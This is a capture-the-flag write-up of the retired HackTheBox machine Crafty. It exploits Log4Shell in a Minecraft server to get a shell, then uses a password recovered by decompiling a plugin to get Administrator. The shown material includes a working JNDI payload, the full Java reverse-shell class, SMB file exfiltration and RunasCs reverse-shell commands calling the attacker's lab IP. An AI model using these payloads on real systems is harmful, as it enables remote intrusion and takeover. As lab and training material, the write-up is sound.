---
title: HTB: Crafty
url: https://0xdf.gitlab.io/2024/06/15/htb-crafty.html
date: 2024-06-15T13:45:00+00:00
difficulty: Easy [20]
os: Windows
tags: htb-crafty, hackthebox, ctf, windows, minecraft, feroxbuster, nmap, wireshark, log4shell, log4j, minecraft-client, cve-2021-44228, java, jd-gui, virus-total, runascs, web.config, htb-logforge
---

![Crafty](/img/crafty-cover.png)

Crafty is all about exploiting a Minecraft server. Minecraft was notoriously vulnerable to Log4Shell due to its use of the Java Log4J package. I’ll use a free Minecraft command line client to connect and send a Log4Shell payload to get a shell on the box. From there, I’ll find a plugin for the Minecraft server and reverse it to find the administrator password. In Beyond Root, I’ll examine and understand the web.config file for the static website.

## Box Info

| Name | [Crafty](https://hackthebox.com/machines/crafty)  [Crafty](https://hackthebox.com/machines/crafty) [Play on HackTheBox](https://hackthebox.com/machines/crafty) |
| --- | --- |
| Release Date | [10 Feb 2024](https://twitter.com/hackthebox_eu/status/1755645192512680303) |
| Retire Date | 15 Jun 2024 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Crafty |
| Radar Graph | Radar chart for Crafty |
| First Blood User | 00:24:32[Vz0n Vz0n](https://app.hackthebox.com/users/1129266) |
| First Blood Root | 00:57:25[Vz0n Vz0n](https://app.hackthebox.com/users/1129266) |
| Creators | [TheCyberGeek TheCyberGeek](https://app.hackthebox.com/users/114053)  [felamos felamos](https://app.hackthebox.com/users/27390) |

## Recon

### nmap

`nmap` finds two open TCP ports, HTTP (80) and Minecraft (25565):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.249
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-10 15:30 EDT
Nmap scan report for 10.10.11.249
Host is up (0.11s latency).
Not shown: 65533 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
25565/tcp open  minecraft

Nmap done: 1 IP address (1 host up) scanned in 13.58 seconds
oxdf@hacky$ nmap -p 80,25565 -sCV 10.10.11.249
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-10 15:30 EDT
Nmap scan report for 10.10.11.249
Host is up (0.11s latency).

PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://crafty.htb
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.95 seconds

```

Based on the [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions), the host is running modern Windows. I’ll note the redirect to `crafty.htb` on 80. I’ll use `ffuf` to scan for other subdomains that respond differently but not find anything. I’ll add `crafty.htb` to my `/etc/hosts` file:

```
10.10.11.249 crafty.htb

```

### Website - TCP 80

#### Site

The page is a Minecraft page:

![image-20240610153630574](/img/image-20240610153630574.png)

The text does show a subdomain, `play.crafty.htb`, which I’ll add to my `/etc/hosts` file. Visiting it in a browser just redirects to `crafty.htb`.

All three of the image in the middle are links, but they all go to `/coming-soon`:

![image-20240610153739460](/img/image-20240610153739460.png)

#### Tech Stack

The HTTP response headers show IIS but not much else:

```

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Fri, 27 Oct 2023 21:56:54 GMT
Accept-Ranges: bytes
ETag: "f431cf7f209da1:0"
Server: Microsoft-IIS/10.0
Date: Mon, 10 Jun 2024 19:36:03 GMT
Connection: close
Content-Length: 1826

```

Trying to guess at extensions, when I go to `/index.html`, it returns a 301 redirect to `/home`:

```

HTTP/1.1 301 Moved Permanently
Content-Type: text/html; charset=UTF-8
Location: http://crafty.htb/home
Server: Microsoft-IIS/10.0
Date: Mon, 10 Jun 2024 19:36:35 GMT
Connection: close
Content-Length: 145

```

`index.html` must exist or be specifically defined, because `/0xdf.html` returns the standard IIS 404 page. It’s not important to solve the box, but I’ll look at how the webserver is serving the static pages and redirects in [Beyond Root](#beyond-root).

#### Directory Brute Force

I’ll run `feroxbuster` against the site using a lowercase wordlist since it’s Windows and case-insensitive:

```

oxdf@hacky$ feroxbuster -u http://crafty.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://crafty.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       58l      150w     1826c http://crafty.htb/
301      GET        2l       10w      145c http://crafty.htb/css => http://crafty.htb/css/
301      GET        2l       10w      144c http://crafty.htb/js => http://crafty.htb/js/
301      GET        2l       10w      145c http://crafty.htb/img => http://crafty.htb/img/
200      GET       58l      150w     1826c http://crafty.htb/home
200      GET       35l       98w     1206c http://crafty.htb/coming-soon
400      GET        6l       26w      324c http://crafty.htb/error%1F_log
400      GET        6l       26w      324c http://crafty.htb/js/error%1F_log
400      GET        6l       26w      324c http://crafty.htb/css/error%1F_log
400      GET        6l       26w      324c http://crafty.htb/img/error%1F_log
[####################] - 56s   106336/106336  0s      found:10      errors:0
[####################] - 55s    26584/26584   483/s   http://crafty.htb/ 
[####################] - 55s    26584/26584   485/s   http://crafty.htb/css/ 
[####################] - 55s    26584/26584   486/s   http://crafty.htb/js/ 
[####################] - 55s    26584/26584   485/s   http://crafty.htb/img/  

```

Nothing interesting.

It’s worth a note that if I ever accidentally start `feroxbuster` with the default list and notice that different casings are showing up in the results, it’s worthwhile to kill it and start over, or else it will spend a bunch of time recursing down the same directory multiple times.

### Minecraft - TCP 25565

#### Manual Enumeration

Typically with an unknown port I’ll try interacting via `curl` and `nc` to see if it replies at all. `curl` returns an error message that is common when the service is not expecting HTTP:

```

oxdf@hacky$ curl http://crafty.htb:25565
curl: (1) Received HTTP/0.9 when not allowed

```

Connecting with `nc`does connection, and then nothing. I can enter text, but it doesn’t respond, until I Ctrl-c to kill the session.

#### Recreate nmap Result

I did note that `nmap` got a version string from the server. I’ll start Wireshark and run `nmap -p 25565 -sCV 10.10.11.249` to scan it again. The interesting TCP stream is the third of three:

![image-20240610155648031](/img/image-20240610155648031.png)

I’ll switch the view from ASCII to Hex Dump:

![image-20240610155710666](/img/image-20240610155710666.png)

I can recreate this with `nc`:

```

oxdf@hacky$ echo -ne "\xfe\x01" | nc crafty.htb 25565
!11271.16.5Crafty Server0100

```

But not much else I can identify manually.

## Shell as svc\_minecraft

### Log4Shell - Background

[Log4Shell](https://en.wikipedia.org/wiki/Log4Shell) is one of the most serious vulnerabilities discovered to date. It is a vulnerability in a common Java logging library, Log4J, that results in remote code execution. Minecraft is a well known service that was vulnerable to Log4Shell.

[This post](https://help.minecraft.net/hc/en-us/articles/4416199399693-Security-Vulnerability-in-Minecraft-Java-Edition) on `help.minecraft.net` talks about how Log4Shell impacts Minecraft. Specifically, for version 1.12-1.16.5, the startup command line must be modified to patch it, or upgrade to 1.17.

I’ve shown Log4Shell exploitation of Minecraft before, for [Hackvent 2023 Day 19](/hackvent2023/hard#hv2319). I’ve shown other exploitations of Log4Shell in [Holiday Hack 2021](/holidayhack2021/a) and on [LogForge](/2021/12/29/htb-logforge.html#log4shell).

### Minecraft Client

To exploit Log4Shell on Minecraft, I need to send a specific message to the commands / chat function. To interact with the Minecraft server, I’ll need a client.

I could download a full Minecraft client, but that costs money. There are many free clients on GitHub! I’ll use Minecraft-Console-Client, downloading the [latest release](https://github.com/MCCTeam/Minecraft-Console-Client).

I’ll run it, giving a username. It asks for a password (I’ll entry blank), and then a server, where I can put in Crafty:

```

oxdf@hacky$ ./MinecraftClient-20240415-263-linux-x64 0xdf
Minecraft Console Client v1.20.4 - for MC 1.4.6 to 1.20.4 - Github.com/MCCTeam
GitHub build 263, built on 2024-04-15 from commit 403284c
Password(invisible): 
You chose to run in offline mode.
Server IP : 
Resolving crafty.htb...
Retrieving Server Info...
Server version : 1.16.5 (protocol v754)
[MCC] Version is supported.
Logging in...
[MCC] Server is in offline mode.
[MCC] Server was successfully joined.
Type '/quit' to leave the server.
> 

```

The [documentation](https://mccteam.github.io/guide/usage.html#internal-commands) has a list of commands, all starting with `/`. If I start typing one, the auto-complete will come up:

![image-20240610172122136](/img/image-20240610172122136.png)

Commands like `/dig` aren’t enabled yet:

```

[MCC] Please enable Terrain and Movements in the config file first.

```

I can list bots (`/bots`) or players (`/list`), though both return empty:

```

[MCC] No bots loaded!
[MCC] PlayerList: 

```

To send a chat, I’ll just send something not starting with `/`, and it displays back:

```

<0xdf> hello! anyone home?

```

Once in a while I can be killed:

```

0xdf was shot by Skeleton
[MCC] You are dead. Type '/respawn' to respawn.
> 

```

`/respawn` and I’m back:

```

[MCC] You have respawned.

```

### Log4Shell POC

#### Vulnerability Background

The issue with Log4Shell is that the Log4J logging module doesn’t handle well the pattern `${[stuff]}`. By putting a JNDI/LDAP url in that pattern, it will cause the logger to fetch data from an arbitrary server and, if that is serialized Java, that leads to execution.

#### Proof of Vulnerability

To test for this, I’ll send listen on TCP port 389 (LDAP default) with `nc` and then enter a payload that will attempt to contact my host on 389:

```

${jndi:ldap://10.10.14.6/test}

```

If there’s a connection to my host, then the server is likely vulnerable to Log4Shell. On sending, I get a connection:

```

oxdf@hacky$ nc -lnvp 389
Listening on 0.0.0.0 389
Connection received on 10.10.11.249 49682
0
 `

```

### Log4Shell Exploit

#### Prep

I had good luck with [this POC](https://github.com/kozmer/log4j-shell-poc) during Hackvent, so I’ll use it again. I’ll clone the repo to my computer and install the dependencies:

```

oxdf@hacky$ git clone https://github.com/kozmer/log4j-shell-poc.git
Cloning into 'log4j-shell-poc'...
remote: Enumerating objects: 52, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (12/12), done.
remote: Total 52 (delta 0), reused 1 (delta 0), pack-reused 40
Receiving objects: 100% (52/52), 38.74 MiB | 44.42 MiB/s, done.
Resolving deltas: 100% (7/7), done.
oxdf@hacky$ cd log4j-shell-poc/ 
oxdf@hacky$ pip install -r requirements.txt
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: colorama in /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (0.4.4)
Collecting argparse
  Using cached argparse-1.4.0-py2.py3-none-any.whl (23 kB)
Installing collected packages: argparse
Successfully installed argparse-1.4.0  

```

There’s also instructions on the repo for downloading a specific Java binary from [this page](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html). I’ll download [jdk-8u20-linux-x64.tar.gz](https://download.oracle.com/otn/java/jdk/8u20-b26/jdk-8u20-linux-x64.tar.gz) from he bottom of that page, and extract it:

```

oxdf@hacky$ tar xf jdk-8u20-linux-x64.tar.gz 
oxdf@hacky$ rm jdk-8u20-linux-x64.tar.gz 
oxdf@hacky$ ls
Dockerfile  jdk1.8.0_20  LICENSE  poc.py  README.md  requirements.txt  target  vulnerable-application

```

#### Run Fail

I’ll run the exploit, giving it my IP, a web port to listen on, and the port I want a shell back on:

```

oxdf@hacky$ python poc.py --userip 10.10.14.6 --webport 8000 --lport 443

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://10.10.14.6:1389/a}

[+] Starting Webserver on port 8000 http://0.0.0.0:8000
Listening on 0.0.0.0:1389

```

It gives me this `${jndi:ldap://10.10.14.6:1389/a}` payload, which I can send to Minecraft (and when I do it :

```

<0xdf> ${jndi:ldap://10.10.14.6:1389/a}
‌> 

```

There’s requests at the exploit server:

```

Listening on 0.0.0.0:1389
Send LDAP reference result for a redirecting to http://10.10.14.6:8000/Exploit.class
10.10.11.249 - - [10/Jun/2024 17:47:28] "GET /Exploit.class HTTP/1.1" 200 -
Send LDAP reference result for a redirecting to http://10.10.14.6:8000/Exploit.class
10.10.11.249 - - [10/Jun/2024 17:47:29] "GET /Exploit.class HTTP/1.1" 200 -
Send LDAP reference result for a redirecting to http://10.10.14.6:8000/Exploit.class
10.10.11.249 - - [10/Jun/2024 17:47:29] "GET /Exploit.class HTTP/1.1" 200 -

```

But no shell connection at `nc`.

#### POC Analysis

The `poc.py` script starts off with a `generate_payload` function that starts defining a template Java program on [lines 15-54](https://github.com/kozmer/log4j-shell-poc/blob/main/poc.py#L15-L54):

```

def generate_payload(userip: str, lport: int) -> None:
    program = """
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

    public Exploit() throws Exception {
        String host="%s";
        int port=%d;
        String cmd="/bin/sh";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),
            pe=p.getErrorStream(),
            si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
    }
}
""" % (userip, lport)

    # writing the exploit to Exploit.java file

    p = Path("Exploit.java")

    try:
        p.write_text(program)
        subprocess.run([os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/javac"), str(p)])
    except OSError as e:
        print(Fore.RED + f'[-] Something went wrong {e}')
        raise e
    else:
        print(Fore.GREEN + '[+] Exploit java class created success')

```

It puts in the IP and port, writes it to disk, and then compiles it with `javac`.

Looking at the payload, it’s using `String cmd="/bin/sh";`, which won’t work on a Windows host. I’ll edit that to `String cmd="cmd.exe";`.

#### Exploit Success

Running the updated exploit, I’ll send the payload to Minecraft. This time there’s only on hit at the exploit:

```

[+] Starting Webserver on port 8000 http://0.0.0.0:8000
Listening on 0.0.0.0:1389
Send LDAP reference result for a redirecting to http://10.10.14.6:8000/Exploit.class
10.10.11.249 - - [10/Jun/2024 17:48:09] "GET /Exploit.class HTTP/1.1" 200 -

```

And a shell at `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.249 49717
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\users\svc_minecraft\server> whoami
crafty\svc_minecraft

```

I like to use `rlwrap` to get things similar to the shell upgrade on Linux.

The user flag is on the desktop:

```

c:\Users\svc_minecraft\Desktop> type user.txt
65b4f5a4************************

```

I’ll also switch to PowerShell:

```

c:\Users\svc_minecraft\Desktop> powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\svc_minecraft\Desktop> 

```

## Shell as Administrator

### Enumeration

#### Website

The website code lives in `C:\inetpub`. The web root is `wwwroot`, which has three files as well as directories:

```

PS C:\inetpub\wwwroot> ls

    Directory: C:\inetpub\wwwroot

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/24/2023   2:20 PM                css
d-----       10/24/2023   2:20 PM                img
d-----       10/24/2023   2:20 PM                js
-a----       10/27/2023   2:56 PM           1206 coming-soon.html
-a----       10/27/2023   2:56 PM           1826 index.html
-a----       10/27/2023   2:58 PM           2396 web.config

```

There’s nothing interesting as far as escalating privileges. It’s just a static site, as expected. This `web.config` file is nice to look at to understand the behavior noted [above](#tech-stack), which I’ll look at in [Beyond Root](#beyond-root).

#### Users

There’s only the administrator user who has a home directory on this box besides svc\_minecraft:

```

PS C:\Users> ls

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/10/2020   8:17 AM                Administrator
d-r---       10/26/2023   7:03 PM                Public
d-----       11/21/2023  12:53 AM                svc_minecraft 

```

The `Public` folder is empty:

```

PS C:\Users> tree /f Public
Folder PATH listing
Volume serial number is C419-63F6
C:\USERS\PUBLIC
Documents
Downloads
Music
Pictures
Videos

```

#### server

The Minecraft server is homed in svc\_minecraft’s home directory in the `server` folder:

```

PS C:\Users\svc_minecraft\server> ls

    Directory: C:\Users\svc_minecraft\server

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----
d-----        6/10/2024  12:11 PM                logs
d-----       10/27/2023   2:48 PM                plugins
d-----        6/10/2024   2:44 PM                world
-a----       11/14/2023  10:00 PM              2 banned-ips.json
-a----       11/14/2023  10:00 PM              2 banned-players.json
-a----       10/24/2023   1:48 PM            183 eula.txt
-a----       11/14/2023  11:22 PM              2 ops.json
-a----       10/24/2023   1:43 PM       37962360 server.jar
-a----       11/14/2023  10:00 PM           1130 server.properties
-a----        6/10/2024   2:38 PM            111 usercache.json
-a----       10/24/2023   1:51 PM              2 whitelist.json

```

I suspect that `server.jar` is a Minecraft server. I’ll take a file hash:

```

PS C:\Users\svc_minecraft\server>  Get-FileHash -algorithm MD5 server.jar

Algorithm       Hash                                                                   Path                            
---------       ----                                                                   ----                            
MD5             C10B74188EFC4ED6960DB49C9ADE50CE                                       C:\Users\svc_minecraft\server...

```

Searching on VT I’ll find [this](https://www.virustotal.com/gui/file/58f329c7d2696526f948470aa6fd0b45545039b64cb75015e64c12194b373da6):

[![image-20240610205928225](/img/image-20240610205928225.png)*Click for full size image*](/img/image-20240610205928225.png)

There’s one positive hit, but only that it has a vulnerable version of Log4J. It’s been on VT since 2021:

![image-20240610210019810](/img/image-20240610210019810.png)

The names show it’s likely a real Minecraft server. The Community tab agress:

[![image-20240610210115023](/img/image-20240610210115023.png)*Click for full size image*](/img/image-20240610210115023.png)

The `plugins` directory has a single Jar:

```

PS C:\Users\svc_minecraft\server\plugins> ls

    Directory: C:\Users\svc_minecraft\server\plugins

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/27/2023   2:48 PM           9996 playercounter-1.0-SNAPSHOT.jar

```

I’ll hash it:

```

PS C:\Users\svc_minecraft\server\plugins> Get-FileHash -algorithm MD5 playercounter-1.0-SNAPSHOT.jar

Algorithm       Hash                                                                   Path                            
---------       ----                                                                   ----                            
MD5             349F6584E18CD85FC9E014DA154EFE03                                       C:\Users\svc_minecraft\server...

```

And find it [on VT](https://www.virustotal.com/gui/file/35871dacd39e66bfa6f07de79d959bea37e91d379ce64ed7cc41e72e51fefafb). It’s first submission was in February 2024, the day after Crafty released!

![image-20240610210333150](/img/image-20240610210333150.png)

That’s a good sign this is something custom to Crafty.

### playercounter-1.0-SNAPSHOT.jar

#### Exfil

To get a copy of this Jar file on my host, I’ll start an SMB server with [Impacket’s](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) `smbserver.py`:

```

oxdf@hacky$ smbserver.py share . -smb2support -username oxdf -password oxdf
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

A username and password are required for most Windows hosts to connect. I’ll mount the share on Crafty:

```

PS C:\Users\svc_minecraft\server\plugins> net use \\10.10.14.6\share /u:oxdf oxdf
The command completed successfully.

```

Now I can copy the binary to my machine:

```

PS C:\Users\svc_minecraft\server\plugins> copy playercounter-1.0-SNAPSHOT.jar \\10.10.14.6\share\

```

I’ll verify the hash matches:

```

oxdf@hacky$ md5sum playercounter-1.0-SNAPSHOT.jar
349f6584e18cd85fc9e014da154efe03  playercounter-1.0-SNAPSHOT.jar

```

#### Reverse Engineering

I’ll grab a copy of [JD-GIU](https://java-decompiler.github.io/) and open the plugin with `java -jar jd-gui-1.6.6.jar playercounter-1.0-SNAPSHOT.jar`.

The project is pretty small:

![image-20240610212323951](/img/image-20240610212323951.png)

`rkon` is a [public library](https://github.com/kr5ch/rkon-core) for the [Source RCON Protocol](https://developer.valvesoftware.com/wiki/Source_RCON_Protocol), designed for game servers. From the docs:

> The **Source RCON Protocol** is a TCP/IP-based communication protocol used by [Source Dedicated Server](https://developer.valvesoftware.com/wiki/Source_Dedicated_Server), which allows console commands to be issued to the server via a “remote console”, or RCON. The most common use of RCON is to allow server owners to control their game servers without direct access to the machine the server is running on. In order for commands to be accepted, the connection must first be authenticated using the server’s RCON password, which can be set using the [console variable](https://developer.valvesoftware.com/wiki/ConVar) *rcon\_password*.

`plungin.yml` has some basic metadata:

```

name: playercounter
version: '1.0-SNAPSHOT'
main: htb.crafty.playercounter.Playercounter
api-version: '1.20'

```

The `Playercounter.class` file has the main part of the plugin:

```

package htb.crafty.playercounter;

import java.io.IOException;
import java.io.PrintWriter;
import net.kronos.rkon.core.Rcon;
import net.kronos.rkon.core.ex.AuthenticationException;
import org.bukkit.plugin.java.JavaPlugin;

public final class Playercounter extends JavaPlugin {
  public void onEnable() {
    Rcon rcon = null;
    try {
      rcon = new Rcon("127.0.0.1", 27015, "s67u84zKq8IXw".getBytes());
    } catch (IOException e) {
      throw new RuntimeException(e);
    } catch (AuthenticationException e2) {
      throw new RuntimeException(e2);
    } 
    String result = null;
    try {
      result = rcon.command("players online count");
      PrintWriter writer = new PrintWriter("C:\\inetpub\\wwwroot\\playercount.txt", "UTF-8");
      writer.println(result);
    } catch (IOException e3) {
      throw new RuntimeException(e3);
    } 
  }
  
  public void onDisable() {}
}

```

It’s connecting to `rkon` on port 27015 with the password “s67u84zKq8IXw”. In theory this is updating a `playercount.txt` in the web directory, though that file doesn’t actually exist on Crafty.

### RunasCs

#### Test Password

Without access to SMB, LDAP, WinRM, Kerberos, or any other authenticated Window services, I don’t have a good way to check this password from my host. I’ll upload a copy of [RunasCs](https://github.com/antonioCoco/RunasCs) by downloading a copy from the releases and hosting it on my Python web server. Then, from a directory svc\_minecraft can write to (I like to stage out of `C:\programdata`), I can request it from Crafty:

```

PS C:\programdata> wget http://10.10.14.6/RunasCs.exe -outfile RunasCs.exe
PS C:\programdata> ls

    Directory: C:\programdata

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d---s-        4/10/2020  10:46 AM                Microsoft
d-----       10/24/2023  12:34 PM                Oracle
d-----         2/6/2024  12:40 AM                Package Cache
d-----       11/21/2023   9:54 PM                regid.1991-06.com.microsoft
d-----        9/15/2018  12:19 AM                SoftwareDistribution
d-----        4/10/2020   5:48 AM                ssh
d-----        4/10/2020  10:49 AM                USOPrivate
d-----        4/10/2020  10:49 AM                USOShared
d-----        8/25/2021   2:57 AM                VMware
-a----        6/10/2024   6:29 PM          51712 RunasCs.exe

```

The basic syntax is `RunasCs.exe <username> <password> <cmd>`. With a bad password, it fails:

```

PS C:\programdata> .\RunasCs.exe Administrator notthepassword "cmd /c whoami"
[-] RunasCsException: LogonUser failed with error code: The user name or password is incorrect

```

But with the password from the plugin it works:

```

PS C:\programdata> .\RunasCs.exe Administrator s67u84zKq8IXw "cmd /c whoami"
crafty\administrator

```

#### Shell

`RunasCs` has a `-r` option that takes an IP and port to connect stdin, stdout, and stderr of the resulting process to, which works very much like a reverse shell. With `nc` listening on TCP 443, I’ll run it:

```

PS C:\programdata> .\RunasCs.exe Administrator s67u84zKq8IXw cmd -r 10.10.14.6:443
[+] Running in session 1 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: WinSta0\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 3436 created in background.

```

At my listening `nc`, there’s a shell as Administrator:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.249 49721
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
crafty\administrator

```

I’ll switch to PowerShell:

```

C:\Windows\system32> powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> 

```

And grab the flag:

```

PS C:\users\administrator\desktop> cat root.txt
eab1ae65************************

```

## Beyond Root

### Webserver Background

I noted above that there was interesting behavior around the `index.html` file on the webserver. Visiting that resulted in a redirect to `/home` Visiting other files that didn’t exist returned an IIS 404.

The only other file I could locate on the webserver is `/coming-soon`.

### web.config

#### Overview

The `web.config` file is where this is all configured. The file is structured as XML data with a series of “rewrite” rules:

```

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <httpRedirect destination="" exactDestination="false" />
        <rewrite>
            <rules>
...[snip]...
            </rules>
        </rewrite>
    </system.webServer>
</configuration>

```

When I show the rules here, I’m removing whitespace from the front to make it easier to read on this page.

#### /home

The first rule is looking for requests for exactly `index.html`:

```

<rule name="RedirectUserFriendlyURL1" stopProcessing="true">
    <match url="^index\.html$" />
    <conditions>
        <add input="{REQUEST_METHOD}" pattern="^POST$" negate="true" />
    </conditions>
    <action type="Redirect" url="home" appendQueryString="false" />
</rule>

```

If it is a POST, it doesn’t match (though I’m not sure why, as the site doesn’t take POST requests). The `action` is to redirect to `/home`, and then on matching it stops processing rules. That explains the redirect to `/home`.

For fun, I’ll find my GET request for `/index.html` in Burp’s Proxy history and send the request to Repeater. Then I’ll right click and change the request method to POST. On sending, the server returns 405 Method Not Allowed:

![image-20240610214214569](/img/image-20240610214214569.png)

The next rule goes with the first:

```

<rule name="RewriteUserFriendlyURL1" stopProcessing="true">
    <match url="^home$" />
    <conditions>
        <add input="{REQUEST_FILENAME}" matchType="IsFile" negate="true" />
        <add input="{REQUEST_FILENAME}" matchType="IsDirectory" negate="true" />
    </conditions>
    <action type="Rewrite" url="index.html" />
</rule>

```

It’s matching on `/home`. The `conditions` look at if the request matches a file or directory. So if there were a file or directory named `home`, then it would match. And since both has `negate="true"`, this rule only applies where there isn’t a file or directory named `home`. On a match, it “rewrites” the url to serve `index.html`.

#### /coming-soon

The `coming-soon` page has two similar rules. The first redirects requests for `/coming-soon.html` to `/coming-soon`:

```

<rule name="RedirectUserFriendlyURL2" stopProcessing="true">
    <match url="^coming-soon\.html$" />
    <conditions>
        <add input="{REQUEST_METHOD}" pattern="^POST$" negate="true" />
    </conditions>
    <action type="Redirect" url="coming-soon" appendQueryString="false" />
</rule>

```

The second rewrites requests to `/coming-soon` to return `coming-soon.html`:

```

<rule name="RewriteUserFriendlyURL2" stopProcessing="true">
    <match url="^coming-soon$" />
    <conditions>
        <add input="{REQUEST_FILENAME}" matchType="IsFile" negate="true" />
        <add input="{REQUEST_FILENAME}" matchType="IsDirectory" negate="true" />
    </conditions>
    <action type="Rewrite" url="coming-soon.html" />
</rule>

```

#### Domain Redirect

The last rule is called “Redirect to domain”:

```

<rule name="Redirect to domain" stopProcessing="true">
    <match url="^(.*)$" />
    <action type="Redirect" url="http://crafty.htb" />
    <conditions>
        <add input="{HTTP_HOST}" pattern="^(?!crafty.htb$).*" />
    </conditions>
</rule>

```

It matches on any url, except the condition looks at the `{HTTP_HOST}`, which is the `Host` header in the request. That regex is using a negative lookahead to say that any pattern that does not start with `crafty.htb` will match. Said differently, if the `Host` header doesn’t start with “crafty.htb”, then this rule will match and redirect to `http://crafty.htb`.